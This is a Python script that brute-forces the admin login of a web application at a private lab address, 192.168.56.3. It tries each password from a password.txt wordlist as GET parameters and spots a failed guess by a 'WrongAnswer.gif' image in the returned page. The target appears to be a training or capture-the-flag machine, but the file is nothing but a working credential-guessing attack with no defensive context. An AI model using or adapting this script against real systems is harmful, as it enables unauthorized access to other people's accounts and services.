#!/usr/bin/python3

import requests
import signal
import sys
from bs4 import BeautifulSoup


def def_handler(sig, frame):
    print ("\n\n[!] Exiting...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


def makeBruteForce():
    f = open("password.txt", "r")
    for x in f:
        params = {
            'page': 'signin',
            'username': 'admin',
            'password': x.strip(),
            'Login': 'Login',
        }
        response = requests.get('http://192.168.56.3/', params=params)
        html_content= response.content
        soup = BeautifulSoup(html_content, 'html.parser')
        if soup.find('img', {'src': 'images/WrongAnswer.gif'}):
            continue
        else:
            print(f"The password is: {x.strip()}")
            sys.exit(0)


if __name__ == '__main__':
    makeBruteForce()
